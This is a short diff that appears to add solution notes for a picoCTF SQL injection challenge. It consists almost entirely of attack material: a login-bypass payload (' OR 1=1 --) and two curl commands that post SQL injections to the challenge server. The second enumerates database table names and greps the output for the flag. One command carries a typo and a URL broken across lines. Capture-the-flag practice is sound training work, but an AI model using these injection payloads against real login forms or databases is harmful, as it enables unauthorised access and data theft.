@@ -1,0 +1,16 @@
+
+login using
+
+user: any
+password: ' OR 1=1 --
+
+
+
+curl -X POST --data search="' OR 1=1 --" http://saturn.picoctf.net:59237/welcome.php
+
+
+
+curl -s -X sPOST --data search="' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --" http://s
+aturn.picoctf.net:59237/welcome.php | grep -RoE "picoCTF{.*?}"
+
+
